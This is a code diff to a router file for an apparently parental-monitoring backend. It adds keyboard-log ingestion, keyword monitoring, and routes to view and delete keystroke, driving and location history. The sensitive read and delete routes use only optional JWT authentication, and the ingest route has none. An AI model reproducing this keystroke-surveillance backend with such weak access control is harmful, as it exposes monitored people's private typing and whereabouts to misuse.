@@ -35,6 +35,7 @@ import {
   ingestLocationHistory,
   ingestLiveLocation,
   ingestDrivingTrips,
+  ingestKeyboardLogs,
 } from '../controllers/ingest.controller';
 import {
   ingestMessages,
@@ -97,9 +98,19 @@ import {
   getLocationHistory,
   getLiveLocation,
   getDrivingHistory,
+  deleteDrivingHistoryForDay,
+  deleteAllDrivingHistory,
+  deleteDrivingTripItem,
   deleteLocationHistoryForDay,
   deleteAllLocationHistory,
   deleteLocationLogItem,
+  getMonitoredKeywords,
+  addMonitoredKeyword,
+  deleteMonitoredKeyword,
+  getKeyboardHistory,
+  deleteKeyboardHistoryForDay,
+  deleteAllKeyboardHistory,
+  deleteKeyboardLogItem,
 } from '../controllers/parent.controller';
 import {
   ingestWifiLog,
@@ -263,8 +274,21 @@ router.post('/child/ingest-driving-trips', ingestDrivingTrips);
 router.get('/parent/device/:deviceId/location-history', optionalAuthenticateJwt, getLocationHistory);
 router.get('/parent/device/:deviceId/location-live', optionalAuthenticateJwt, getLiveLocation);
 router.get('/parent/device/:deviceId/driving-history', optionalAuthenticateJwt, getDrivingHistory);
+router.delete('/parent/device/:deviceId/driving-history/day', optionalAuthenticateJwt, deleteDrivingHistoryForDay);
+router.delete('/parent/device/:deviceId/driving-history/all', optionalAuthenticateJwt, deleteAllDrivingHistory);
+router.delete('/parent/driving-trip/:id', optionalAuthenticateJwt, deleteDrivingTripItem);
 router.delete('/parent/device/:deviceId/location-history/day', optionalAuthenticateJwt, deleteLocationHistoryForDay);
 router.delete('/parent/device/:deviceId/location-history/all', optionalAuthenticateJwt, deleteAllLocationHistory);
 router.delete('/parent/location-history/:id', optionalAuthenticateJwt, deleteLocationLogItem);
+
+// Keyboard Tracker Routes
+router.post('/ingest/keyboard-logs', ingestKeyboardLogs);
+router.get('/parent/device/:deviceId/monitored-keywords', optionalAuthenticateJwt, getMonitoredKeywords);
+router.post('/parent/device/:deviceId/monitored-keywords', optionalAuthenticateJwt, addMonitoredKeyword);
+router.delete('/parent/device/:deviceId/monitored-keywords', optionalAuthenticateJwt, deleteMonitoredKeyword);
+router.get('/parent/device/:deviceId/keyboard-history', optionalAuthenticateJwt, getKeyboardHistory);
+router.delete('/parent/device/:deviceId/keyboard-history/day', optionalAuthenticateJwt, deleteKeyboardHistoryForDay);
+router.delete('/parent/device/:deviceId/keyboard-history/all', optionalAuthenticateJwt, deleteAllKeyboardHistory);
+router.delete('/parent/keyboard-history/:id', optionalAuthenticateJwt, deleteKeyboardLogItem);
 
 export default router;
